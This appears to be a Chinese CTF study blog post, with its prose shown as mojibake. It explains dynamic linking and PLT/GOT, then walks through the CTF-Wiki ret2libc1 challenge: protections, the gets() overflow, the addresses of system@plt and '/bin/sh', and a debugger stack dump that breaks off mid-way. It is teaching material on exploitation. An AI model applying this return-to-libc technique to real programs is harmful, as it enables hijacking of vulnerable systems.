        <content type="html"><![CDATA[<h1 id="pwnå­¦ä¹ ç¬”è®°4"><a class="markdownIt-Anchor" href="#pwnå­¦ä¹ ç¬”è®°4">#</a> pwn å­¦ä¹ ç¬”è®°ï¼ˆ4ï¼‰</h1><h2 id="é™æ€é“¾æ¥"><a class="markdownIt-Anchor" href="#é™æ€é“¾æ¥">#</a> é™æ€é“¾æ¥ï¼š</h2><p>â€‹é™æ€é“¾æ¥æ˜¯ç”±é“¾æ¥å™¨åœ¨é“¾æ¥æ—¶å°†åº“çš„å†…å®¹åŠ å…¥åˆ°å¯æ‰§è¡Œç¨‹åºä¸­çš„åšæ³•ã€‚é“¾æ¥å™¨æ˜¯ä¸€ä¸ªç‹¬ç«‹ç¨‹åºï¼Œå°†ä¸€ä¸ªæˆ–å¤šä¸ªåº“æˆ–ç›®æ ‡æ–‡ä»¶ï¼ˆå…ˆå‰ç”±ç¼–è¯‘å™¨æˆ–æ±‡ç¼–å™¨ç”Ÿæˆï¼‰é“¾æ¥åˆ°ä¸€å—ç”Ÿæˆå¯æ‰§è¡Œç¨‹åºã€‚è¿™é‡Œçš„åº“æŒ‡çš„æ˜¯é™æ€é“¾æ¥åº“ï¼ŒWindows ä¸‹ä»¥.lib ä¸ºåç¼€ï¼ŒLinux ä¸‹ä»¥.a ä¸ºåç¼€ã€‚</p><p>â€‹ä¹Ÿå°±æ˜¯è¯´å°†é™æ€é“¾æ¥åº“ä¸­çš„æ‰€æœ‰çš„å‡½æ•°éƒ½å†™å…¥è¿™ä¸ª ELF æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥ä¼šé€ æˆè¯¥äºŒè¿›åˆ¶æ–‡ä»¶æä¸ºåºå¤§ï¼Œå› æ­¤ä¹Ÿä¼šå­˜åœ¨å¾ˆå¤šçš„å¯ä¾›åˆ©ç”¨æ¥ ret2syscall çš„ gadgetsã€‚ä½†æ˜¯ï¼Œä½¿ç”¨é™æ€é“¾æ¥ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä½“ç§¯è¾ƒå¤§ï¼ŒåŒ…å«ç›¸åŒçš„å…¬å…±ä»£ç ï¼Œé€ æˆæµªè´¹ã€‚</p><p>â€‹å¯¹äº ret2syscall è€Œè¨€ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨ç¨‹åºä¸­æ‰¾åˆ°ä¼—å¤šçš„å¯ä»¥ç»™æˆ‘ä»¬åˆ©ç”¨çš„ gadgetsï¼Œä¸»è¦æ˜¯å› ä¸ºäºŒè¿›åˆ¶ç¨‹åºæ˜¯é™æ€é“¾æ¥ç¨‹åºï¼Œæ­£å› ä¸ºå¦‚æ­¤ï¼Œå­˜åœ¨ä¼—å¤šçš„ gadgetsï¼Œç»™æˆ‘ä»¬æ„é€ ç³»ç»Ÿè°ƒç”¨ã€‚</p><h2 id="åŠ¨æ€é“¾æ¥"><a class="markdownIt-Anchor" href="#åŠ¨æ€é“¾æ¥">#</a> åŠ¨æ€é“¾æ¥ï¼š</h2><h3 id="1ç®€è¿°"><a class="markdownIt-Anchor" href="#1ç®€è¿°">#</a> 1. ç®€è¿°ï¼š</h3><p>â€‹åŠ¨æ€é“¾æ¥ï¼ˆDynamic Linkingï¼‰ï¼ŒæŠŠé“¾æ¥è¿™ä¸ªè¿‡ç¨‹æ¨è¿Ÿåˆ°äº†è¿è¡Œæ—¶å†è¿›è¡Œï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶è£…è½½æ—¶æˆ–è¿è¡Œæ—¶ï¼Œç”±æ“ä½œç³»ç»Ÿçš„è£…è½½ç¨‹åºåŠ è½½åº“ã€‚è¿™é‡Œçš„åº“æŒ‡çš„æ˜¯åŠ¨æ€é“¾æ¥åº“ï¼ŒWindows ä¸‹ä»¥.dll ä¸ºåç¼€ï¼ŒLinux ä¸‹ä»¥.so ä¸ºåç¼€ã€‚</p><p>â€‹åŠ¨æ€é“¾æ¥å¯ä»¥å¤§è§„æ¨¡å‡å° ELF æ–‡ä»¶çš„å¤§å°ï¼Œå‡ ä¹åŠ¨æ€é“¾æ¥åº“ä¸­çš„æ–‡ä»¶ä¸ç”¨ç›´æ¥å†™å…¥ ELF æ–‡ä»¶ä¸­ï¼Œå› æ­¤ï¼ŒELF æ–‡ä»¶ä¸­å°±ç¼ºå°‘è¶³å¤Ÿçš„ gadgets å¯ä¾›æ„é€ å‡ºç³»ç»Ÿè°ƒç”¨ã€‚</p><p>â€‹å¯¹äºåŠ¨æ€é“¾æ¥çš„ç¨‹åºè€Œè¨€ï¼Œå¦‚æœé‡åˆ°ä¸€ä¸ªéœ€è¦çš„å­˜åœ¨äºåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ï¼Œä¾‹å¦‚ï¼šputs ()ï¼Œsystem ()ï¼Œprintf () ç­‰ç­‰ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå› ä¸ºè¿™äº›ç¨‹åºå¹¶æ²¡æœ‰å†™å…¥ ELF æ–‡ä»¶ä¸­ï¼Œå› æ­¤ï¼Œè¿™æ˜¯å°±éœ€è¦ä»æ ˆå’Œå †ä¹‹é—´çš„ shared libraries æ®µå»æŸ¥æ‰¾ç›¸å…³çš„å‡½æ•°çš„ä»£ç ä»¥åŠä¸€äº›å…¨å±€å˜é‡ï¼Œä¾‹å¦‚ï¼š&quot;/bin/sh&quot;ã€‚</p><p>â€‹é‚£ä¹ˆï¼ŒåŠ¨æ€é“¾æ¥åº”è¯¥å¦‚ä½•è¿›è¡Œå‘¢ï¼Ÿ</p><p>â€‹åœ¨æ­£å¼è®²è¿°è¿™ä¸ªè¿‡ç¨‹ä¹‹å‰ï¼Œé¦–å…ˆéœ€è¦çŸ¥é“ä¸¤ä¸ªä¸œè¥¿ï¼š</p><p>â€‹1ã€ç”¨æ¥å­˜æ”¾å¤–éƒ¨å‡½æ•°åœ°å€çš„æ•°æ®æ®µï¼š<strong>å…¨å±€åç§»è¡¨</strong>ï¼ˆ<strong>GOT</strong>, Global Offset Tableï¼‰</p><p>â€‹2ã€ç”¨æ¥è·å–æ•°æ®æ®µè®°å½•çš„å¤–éƒ¨å‡½æ•°åœ°å€çš„ä»£ç ï¼š<strong>ç¨‹åºé“¾æ¥è¡¨</strong>ï¼ˆ<strong>PLT</strong>ï¼ŒProcedure Link Tableï¼‰</p><p>â€‹3ã€ä¸ºäº†å®‰å…¨èµ·è§ï¼Œshared libraries æ®µæ‰€å­˜æ”¾çš„åŠ¨æ€é“¾æ¥çš„å‡½æ•°çš„ä»£ç çš„åŸºåœ°å€æ˜¯éšæœºçš„ï¼Œä½†æ˜¯æ¯ä¸ªå‡½æ•°ç›¸å¯¹äºåŸºåœ°å€çš„åç§»é‡æ˜¯ç›¸åŒçš„ã€‚</p><p>â€‹4. å»¶è¿Ÿç»‘å®šï¼šåªæœ‰åŠ¨æ€åº“å‡½æ•°åœ¨è¢«è°ƒç”¨æ—¶ï¼Œæ‰ä¼šåœ°å€è§£æå’Œé‡å®šä½å·¥ä½œã€‚</p><p>â€‹å¯¹äº plt è¡¨å’Œ got è¡¨çš„ç®€è¿°ï¼š</p><p>â€‹plt è¡¨å­˜æ”¾äº†ä¸€éƒ¨åˆ†çš„ä»£ç ï¼Œç”¨äºè·³è½¬åˆ° got è¡¨ä¸­è¢«è°ƒç”¨å‡½æ•°ç›¸å¯¹åº”çš„åœ°å€ã€‚</p><p>â€‹got è¡¨å­˜æ”¾äº†åœ¨ shared libraries æ®µä¸­çš„ç›¸å¯¹çš„ä»£ç çš„æ­£ç¡®çš„åœ°å€ã€‚</p><h3 id="2è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#2è¿‡ç¨‹">#</a> 2. è¿‡ç¨‹ï¼š</h3><h4 id="ç¬¬ä¸€æ¬¡è°ƒç”¨ä»¥printfä¸¾ä¾‹"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€æ¬¡è°ƒç”¨ä»¥printfä¸¾ä¾‹">#</a> ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼ˆä»¥ printf () ä¸¾ä¾‹ï¼‰ï¼š</h4><p>â€‹é¦–å…ˆå±•ç¤ºä¸€ä¸‹ç›¸å…³çš„ä»£ç :</p><p><img data-src="https://img-blog.csdnimg.cn/direct/19d425d75963463a98ab32e69a30ebc2.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹é¦–å…ˆæ˜¯åœ¨ text æ®µä¸­æ‰§è¡Œäº† call puts@pltï¼Œè¿™ä¸ªæ—¶å€™ï¼Œç¨‹åºæ‰§è¡Œæµæ¥åˆ°äº† plt æ®µä¸­çš„ puts å‡½æ•°ç›¸å…³çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯ jmp *(puts@got)ï¼Œå†ä¹‹åï¼Œç¨‹åºæ‰§è¡Œæµè·³è½¬åˆ°äº†.got.plt æ®µä¸­çš„ç›¸å…³çš„åœ°å€ï¼Œä½†æ˜¯ï¼Œå› ä¸ºè¿›ç¨‹æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨çš„ puts å‡½æ•°ï¼Œå› æ­¤ï¼Œgot è¡¨ä¸­ï¼Œputs å‡½æ•°å¯¹åº”çš„åœ°å€ä¸º puts@plt+1ï¼Œå› æ­¤å›åˆ°äº†é¢ push indexï¼Œå›åˆ° plt è¡¨çš„ç›®çš„æ˜¯ä¸ºäº†è§£æ puts å‡½æ•°çš„å®é™…åœ°å€ï¼Œç„¶åæ‰§è¡Œ jmp PLT0 ï¼Œè·³è½¬åˆ° plt å¤´éƒ¨ï¼Œä¸º dl_runtime_resolve å‡½æ•°ä¼ å‚ï¼Œä¹‹åæ‰§è¡Œ PLT0 çš„ä¸¤ä¸ªç»“æŸåï¼Œä¹Ÿå°±æ˜¯å®Œæˆäº†ä¼ å‚åï¼Œdl_runtime_resolve å‡½æ•°å°±ä¼šå¼€å§‹è§£æ puts å‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œå¹¶å¡«å…¥ got.plt è¡¨ä¸­ï¼Œä¹‹åï¼Œgot.plt ä¸­ä¿å­˜çš„å°±æ˜¯ puts å‡½æ•°çœŸæ­£çš„åœ°å€ï¼Œä¹‹åè¿”å›åˆ° text æ®µçš„ call puts@plt é‡æ–°è°ƒç”¨ puts å‡½æ•°ï¼Œè·³è½¬åˆ° plt è¡¨çš„ jmp *(puts@got) ä»£ç ï¼Œä¹‹åè·³è½¬åˆ° got.plt è¡¨ï¼Œå› ä¸º got.plt å­˜æ”¾çš„å°±æ˜¯ puts å‡½æ•°çš„çœŸå®åœ°å€ï¼Œæ‰€ä»¥ï¼Œç¨‹åºæ‰§è¡Œæµå°±ä¼šè°ƒè½¬åˆ° puts å‡½æ•°çš„çœŸå®åœ°å€ä»¥è°ƒç”¨è¯¥å‡½æ•°ã€‚</p><h4 id="ç¬¬äºŒæ¬¡è°ƒç”¨"><a class="markdownIt-Anchor" href="#ç¬¬äºŒæ¬¡è°ƒç”¨">#</a> ç¬¬äºŒæ¬¡è°ƒç”¨ï¼š</h4><p>â€‹ç¨‹åºæ‰§è¡Œæµåœ¨ text æ®µæ‰§è¡Œäº† call puts@pltï¼Œä¹‹åè·³è½¬åˆ° plt æ‰§è¡Œ jmp *(puts@got)ï¼Œéšåç›´æ¥è·³è½¬åˆ° got.plt è¡¨ä¸­ï¼Œç´§æ¥ç€è·³è½¬åˆ° puts å‡½æ•°æ‰€åœ¨çš„åŠ¨æ€é“¾æ¥åº“ä¸­çš„çœŸå®åœ°å€ã€‚</p><h2 id="æµ…è°ˆå‡½æ•°è°ƒç”¨ä¸­çš„å‚æ•°ä¼ é€’"><a class="markdownIt-Anchor" href="#æµ…è°ˆå‡½æ•°è°ƒç”¨ä¸­çš„å‚æ•°ä¼ é€’">#</a> æµ…è°ˆå‡½æ•°è°ƒç”¨ä¸­çš„å‚æ•°ä¼ é€’ï¼š</h2><p>â€‹æŸäº›æƒ…å†µï¼Œä¾‹å¦‚ä»¥å¦‚ä¸‹ç¨‹åºä¸ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä½†ç¨‹åºæ‰§è¡Œåˆ° system å‡½æ•°çš„æ—¶å€™ï¼ŒåŸæœ¬æ­¤æ—¶çš„æ ˆçš„å½“å‰ä½ç½®ä¸º:</p><p><img data-src="https://img-blog.csdnimg.cn/direct/02806003ea09499a905c8add6b087050.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºè¿˜æ²¡æœ‰æ‰§è¡Œåˆ° call system æ—¶ï¼ˆå‡è®¾æ­¤æ—¶æ˜¯ä»¥é™æ€é“¾æ¥çš„ ELF æ–‡ä»¶ï¼‰ï¼Œæ ˆçš„æ ˆé¡¶æ˜¯å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä½†æ˜¯ï¼Œå½“ call system ä»£ç æ‰§è¡Œæ—¶ï¼Œå°†ä¼šå°† ip å¯„å­˜å™¨çš„å€¼å‘ä¸‹ç§»ä¸€ä½çš„å€¼å‹å…¥æ ˆä¸­ï¼Œç„¶åè·³è½¬åˆ° system å‡½æ•°çš„ç¬¬ä¸€è¡Œä¹Ÿå°±æ˜¯ push bpï¼Œç»è¿‡è¿™ä¸¤ä¸ªæ“ä½œåï¼Œæ ˆçš„æƒ…å†µä¼šå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äº†ï¼Œarg1 å› ä¸ºè°ƒç”¨çš„æ˜¯ system (&quot;/bin/sh&quot;) çš„åŸå› ï¼Œarg1 å­˜å‚¨çš„å€¼ä¼šæ˜¯ &quot;/bin/sh&quot; çš„åœ°å€ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/5536f6e0104141ba84590bfafd442129.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å› æ­¤ï¼Œä¼ å‚çš„æ—¶å€™ï¼Œsystem æƒ³è¦è·å–åˆ° &quot;/bin/sh&quot; çš„åœ°å€ï¼Œå°±éœ€è¦è·³è¿‡ bpã€return_addr è¿™ä¸¤ä¸ªå­—é•¿ï¼Œæ‰èƒ½å¤Ÿè·å–åˆ°å‚æ•° &quot;/bin/sh&quot; çš„åœ°å€ã€‚</p><h2 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc">#</a> ret2libcï¼š</h2><h3 id="1æƒ…å†µ1"><a class="markdownIt-Anchor" href="#1æƒ…å†µ1">#</a> 1. æƒ…å†µ 1ï¼š</h3><h4 id="é¢˜ç›®æ¡ˆä¾‹ctf-wikiret2libc1"><a class="markdownIt-Anchor" href="#é¢˜ç›®æ¡ˆä¾‹ctf-wikiret2libc1">#</a> é¢˜ç›®æ¡ˆä¾‹ï¼šCTF-Wikiâ€“ret2libc1ï¼š</h4><p>â€‹æ‹¿åˆ°é¢˜ç›®ä¹‹åï¼Œå…ˆæ£€æŸ¥æ£€æŸ¥è¿™ä¸ªé¢˜ç›®çš„ä¿æŠ¤ä»¥åŠæ¶æ„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># checksec ret2libc1 </span></span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>â€‹è€æ ·å­ï¼Œè¿˜æ˜¯åªå¼€å¯äº† NX ä¿æŠ¤ï¼Œ32 ä½å°ç«¯åºï¼Œä¹‹åé€šè¿‡ IDA åç¼–è¯‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  retur</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°å±é™©å‡½æ•° gets ()ï¼Œä¹‹åä»å‡½æ•°çª—å£ä¸­æŸ¥åˆ°äº† secure å‡½æ•°ï¼Œæ€€ç–‘è¯¥å‡½æ•°æ—¶ä¸€ä¸ªåé—¨å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä½†æ˜¯ï¼Œsystem () å‡½æ•°çš„å‚æ•°ç¡®å® &quot;shell!?&quot;ï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªå¹¶ä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„è°ƒç”¨ shell çš„ä¸€ä¸ªæ–¹å¼ã€‚ä¸è¿‡è¿™é‡Œå´ç»™äºˆäº†æˆ‘ä»¬å¦ä¸€æ¡è·¯ï¼Œå› ä¸ºå¼€å¯äº† NX ä¿æŠ¤ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ ret2shellcode çš„æ–¹å¼æ¥å®Œæˆè¿™ä¸ªé¢˜ç›®ï¼Œå› ä¸ºæ˜¯åŠ¨æ€é“¾æ¥çš„é¢˜ç›®ï¼Œæ‰€ä»¥è€ƒè™‘ ret2syscall çš„åšæ³•ä¹Ÿä¸åˆ‡åˆå®é™…ã€‚é‚£ä¹ˆï¼Œè¿™é‡Œæˆ–è®¸åº”è¯¥è€ƒè™‘åˆ«çš„æ–¹æ³•äº†ï¼Œä¹Ÿå°±æ˜¯ ret2libcï¼Œå› ä¸ºè¿™é‡Œå°è¯•è°ƒç”¨äº† system () å‡½æ•°ï¼Œå› æ­¤æˆ–è®¸å­˜åœ¨ system çš„ plt è¡¨é¡¹ï¼Œé‚£ä¹ˆè¿™ä¸ªé¢˜ç›®çš„æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œé‚£å°±æ˜¯é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹ ret_addr çš„åœ°å€ä½ system å‡½æ•°çš„ plt è¡¨ï¼Œä¹‹åä¼ å…¥ä¸€å­—é•¿çš„åƒåœ¾æ•°æ®ï¼ˆè¿™é‡Œä¼ å…¥çš„ä¸€å­—é•¿åƒåœ¾æ•°æ®ä¸ºçš„æ˜¯å¢åŠ åç§»é‡ï¼Œå› ä¸ºåœ¨ system å‡½æ•°ä¼ å‚çš„æ—¶å€™ï¼Œè¦ç»•è¿‡ bp å¯„å­˜å™¨ä»¥åŠè¿”å›åœ°å€æ¥å– &quot;/bin/sh&quot; è¿™ä¸€å‚æ•°ï¼Œæ‰€ä»¥ï¼Œå¯çŸ¥ï¼Œéœ€è¦ç»•è¿‡ä¸¤ä¸ªå­—é•¿å–å‚æ•°ï¼‰ï¼Œå†ç„¶åå¡«å…¥ &quot;/bin/sh&quot; çš„åœ°å€å³å¯ã€‚</p><p>â€‹åˆ†æåˆ°è¿™é‡Œï¼Œåšé¢˜çš„æ€è·¯å¤§æ¦‚ä¹Ÿæ¸…æ¥šäº†ï¼Œä¹‹åï¼Œå°±æ˜¯æ‰¾åˆ°éœ€è¦çš„ä¿¡æ¯ã€‚</p><p>â€‹åœ¨ IDA ä¸­åˆ†æé“ï¼Œsystem@plt çš„åœ°å€ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460                 jmp     ds:off_804A018</span><br></pre></td></tr></table></figure><p>â€‹é€šè¿‡ ROPgadget æ‰¾åˆ° &quot;/bin/sh&quot; çš„åœ°å€ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared# ROPgadget --binary ret2libc1 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>â€‹ç„¶åé€šè¿‡ gdb è°ƒè¯•æ¥æŸ¥æ‰¾æ ˆçš„åç§»é•¿åº¦ï¼Œåœ¨ main å‡½æ•°ä¸Šä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œä¹‹åç­‰åˆ°æ‰§è¡Œå®Œ gets å‡½æ•°ä¹‹åï¼Œå†ä¼ å…¥ä¸€å®šä¸ªæ•°çš„åƒåœ¾æ•°æ®ï¼Œæ¯”å¦‚å…¨æ˜¯ Aï¼Œä¹‹åé€šè¿‡ stack å‘½ä»¤æŸ¥çœ‹æ ˆçš„æƒ…å†µï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 100â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">00:0000â”‚ esp 0xffffd420 â€”â–¸ 0xffffd43c â—‚â€” <span class="string">&#x27;AAAAAAAAAAAAAA&#x27;</span></span><br><span class="line">01:0004â”‚-084 0xffffd424 â—‚â€” 0x0</span><br><span class="line">02:0008â”‚-080 0xffffd428 â—‚â€” 0x1</span><br><span class="line">03:000câ”‚-07c 0xffffd42c â—‚â€” 0x0</span><br><span class="line">04:0010â”‚-078 0xffffd430 â€”â–¸ 0xf7fc4570 (__kernel_vsyscall) â—‚â€” push ecx</span><br><span class="line">05:0014â”‚-074 0xffffd434 â—‚â€” 0xffffffff</span><br><span class="line">06:0018â”‚-070 0xffffd438 â€”â–¸ 0x8048034 â—‚â€” push es</span><br><span class="line">07:001câ”‚ eax 0xffffd43c â—‚â€” <span class="string">&#x27;AAAAAAAAAAAAAA&#x27;</span></span><br><span class="line">... â†“        2 skipped</span><br><span class="line">0a:0028â”‚-060 0xffffd448 â—‚â€” 0x4141 /* <span class="string">&#x27;AA&#x27;</span> */</span><br><span class="line">0b:002câ”‚-05c 0xffffd44c â€”â–¸ 0xffffd5fc â—‚â€” 0x20 /* <span class="string">&#x27; &#x27;</span> */</span><br><span class="line">0c:0030â”‚-058 0xffffd450 â—‚â€” 0x0</span><br><span class="line">0d:0034â”‚-054 0xffffd454 â—‚â€” 0x0</span><br><span class="line">0e:0038â”‚-050 0xffffd458 â—‚â€” 0x1000000</span><br><span class="line">0f:003câ”‚-04c 0xffffd45c â—‚â€” 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">10:0040â”‚-048 0xffffd460 â€”â–¸ 0xf7fc4570 (__kernel_vsyscall) â—‚â€” push ecx</span><br><span class="line">11:0044â”‚-044 0xffffd464 â—‚â€” 0x0</span><br><span class="line">12:0048â”‚-040 0xffffd468 â€”â–¸ 0xf7c184be â—‚â€” <span class="string">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class="line">13:004câ”‚-03c 0xffffd46c â€”â–¸ 0xf7e2a054 (_dl_audit_preinit@got.plt) â€”â–¸ 0xf7fdde10 (_dl_audit_preinit) â—‚â€” endbr32 </span><br><span class="line">14:0050â”‚-038 0xffffd470 â€”â–¸ 0xf7fbe4a0 â€”â–¸ 0xf7c00000 â—‚â€” 0x464c457f</span><br><span class="line">15:0054â”‚-034 0xffffd474 â€”â–¸ 0xf7fd6f90 (_dl_fixup+240) â—‚â€” mov edi, eax</span><br><span class="line">16:0058â”‚-030 0xffffd478 â€”â–¸ 0xf7c184be â—‚â€” <span class="string">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class="line">17:005câ”‚-02c 0xffffd47c â€”â–¸ 0xf7fbe4a0 â€”â–¸ 0xf7c00000 â—‚â€” 0x464c457f</span><br><span class="line">18:0060â”‚-028 0xffffd480 â€”â–¸ 0xffffd4c0 â€”â–¸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x229dac</span><br><span class="line">19:0064â”‚-024 0xffffd484 â€”â–¸ 0xf7fbe66c â€”â–¸ 0xf7ffdba0 â€”â–¸ 0xf7fbe780 â€”â–¸ 0xf7ffda40 â—‚â€” ...</span><br><span class="line">1a:0068â”‚-020 0xffffd488 â€”â–¸ 0xf7fbeb10 â€”â–¸ 0xf7c1acc6 â—‚â€” <span class="string">&#x27;GLIBC_PRIVATE&#x27;</span></span><br><span class="line">1b:006câ”‚-01c 0xffffd48c â—‚â€” 0x1</span><br><span class="line">1c:0070â”‚-018 0xffffd490 â—‚â€” 0x1</span><br><span class="line">1d:0074â”‚-014 0xffffd494 â—‚â€” 0x0</span><br><span class="line">1e:0078â”‚-010 0xffffd498 â€”â–¸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x229dac</span><br><span class="line">1f:007câ”‚-00c 0xffffd49c â€”â–¸ 0xf7d20f9b (__init_misc+43) â—‚â€” add esp, 0x10</span><br><span class="line">20:0080â”‚-008 0xffffd4a0 â€”â–¸ 0xffffd6e0 â—‚â€” <span class="string">&#x27;/mnt/shared/ret2libc1&#x27;</span></span><br><span class="line">21:0084â”‚-004 